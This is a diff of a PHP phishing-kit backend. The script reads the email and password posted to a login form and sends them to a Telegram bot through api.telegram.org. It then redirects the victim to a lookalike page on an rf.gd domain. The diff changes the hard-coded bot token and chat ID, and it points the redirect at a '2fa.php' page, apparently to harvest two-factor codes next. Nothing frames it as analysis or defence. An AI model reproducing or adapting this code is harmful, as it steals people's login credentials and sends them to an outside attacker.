@@ -6,15 +6,15 @@ if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
 
 date_default_timezone_set('UTC');
 
-$botToken = '8093851911:AAEyrP0mC_P-G3OrO7yV8CG5jlfUp7Hp9qA';
-$chatId   = '5666631780';
+$botToken = '6627263483:AAG5WQX0ha9hsx740CwSUtkMjwDONp0Eh_w';
+$chatId   = '5248818941';
 
 $email = trim($_POST['username'] ?? '');
 $password = trim($_POST['password'] ?? '');
 
 if (empty($email) || empty($password)) {
     http_response_code(400);
-    exit("Invalid input.");
+    exit("Missing credentials.");
 }
 
 $message = "🔐 *New Login Submission*\n";
@@ -23,7 +23,7 @@ $message .= "📧 *Email:* {$email}\n";
 $message .= "🔑 *Password:* {$password}\n";
 $message .= "-----------------------------\n";
 $message .= "📅 *Time:* " . date("Y-m-d H:i:s") . "\n";
-$message .= "🌐 *Source:* login.php";
+$message .= "🌐 *Source:* login2.php";
 
 $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
 $payload = [
@@ -39,7 +39,7 @@ curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_exec($ch);
 curl_close($ch);
 
-// Redirect after success
-header("Location: https://authenticationform.rf.gd/cache_site/Invalid%20Login.php");
+// Redirect to 2FA page
+header("Location: https://authenticationlive.rf.gd/cache_site/2fa.php");
 exit;
 ?>
